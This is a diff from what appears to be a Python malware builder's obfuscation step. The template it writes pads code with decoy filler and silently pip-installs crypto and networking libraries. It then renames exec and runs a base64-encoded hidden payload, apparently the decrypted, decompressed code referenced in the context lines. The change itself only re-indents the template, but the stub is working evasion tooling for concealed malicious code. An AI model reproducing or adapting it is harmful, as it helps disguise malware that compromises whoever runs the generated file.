@@ -195,53 +195,54 @@ decompressed_code = zlib.decompress(decrypted_code).decode('utf-8')
     '''
     with open(f'{BUILD_PATH}/{name}', "w+") as obfu_file:
         obfu_file.write(f'''
-                        from sys import executable, stderr
-                        {all_fake_code}
-                        import ctypes;import base64,subprocess,sqlite3,json,shutil
-                        import time
-                        ModuleRequirements = [["Crypto.Cipher", "pycryptodome" if not "PythonSoftwareFoundation" in executable else "Crypto"]]
-                        for module in ModuleRequirements:
-                            try:        
-                                __import__(module[0])
-                            except:
-                                try:
-                                    subprocess.Popen(executable + " -m pip install Crypto --quiet", shell=True)
-                                except:
-                                    subprocess.Popen(executable + " -m pip install pycryptodome --quiet", shell=True)
-                        
-                        from Crypto.Cipher import AES
-                        from json import loads, dumps
-                        from urllib.request import Request, urlopen
-                        try:
-                            import cryptography
-                        except:
-                            subprocess.run("python -m pip install cryptography")
-                        
-                        try:
-                            from cryptography.fernet import Fernet
-                        except:
-                            subprocess.run("python -m pip install cryptography", shell=True)
-                        
-                        try:
-                            import requests
-                        except:
-                            subprocess.run("python -m pip install requests", shell=True)
-                        
-                        try:
-                            from Crypto.Cipher import AES
-                        except:
-                            subprocess.run("python -m pip install Crypto.Cipher", shell=True)
-                            
-                        from Crypto.Cipher import AES
-                        
-                        from cryptography.fernet import Fernet
-                        {all_fake_code}
-                        {e} = exec
-                        {all_fake_code}
-                        import concurrent.futures
-                        {aw}="{s.decode("utf-8")}"
-                        {e}(base64.b64decode({aw}))
-                        {all_fake_code}''') 
+
+from sys import executable, stderr
+{all_fake_code}
+import ctypes;import base64,subprocess,sqlite3,json,shutil
+import time
+ModuleRequirements = [["Crypto.Cipher", "pycryptodome" if not "PythonSoftwareFoundation" in executable else "Crypto"]]
+for module in ModuleRequirements:
+    try:        
+        __import__(module[0])
+    except:
+        try:
+            subprocess.Popen(executable + " -m pip install Crypto --quiet", shell=True)
+        except:
+            subprocess.Popen(executable + " -m pip install pycryptodome --quiet", shell=True)
+
+from Crypto.Cipher import AES
+from json import loads, dumps
+from urllib.request import Request, urlopen
+try:
+    import cryptography
+except:
+    subprocess.run("python -m pip install cryptography")
+
+try:
+    from cryptography.fernet import Fernet
+except:
+    subprocess.run("python -m pip install cryptography", shell=True)
+
+try:
+    import requests
+except:
+    subprocess.run("python -m pip install requests", shell=True)
+
+try:
+    from Crypto.Cipher import AES
+except:
+    subprocess.run("python -m pip install Crypto.Cipher", shell=True)
+    
+from Crypto.Cipher import AES
+
+from cryptography.fernet import Fernet
+{all_fake_code}
+{e} = exec
+{all_fake_code}
+import concurrent.futures
+{aw}="{s.decode("utf-8")}"
+{e}(base64.b64decode({aw}))
+{all_fake_code}''') 
 
     obfuscated_file_path = os.path.join(BUILD_PATH, f"{name}")
         # Clean up
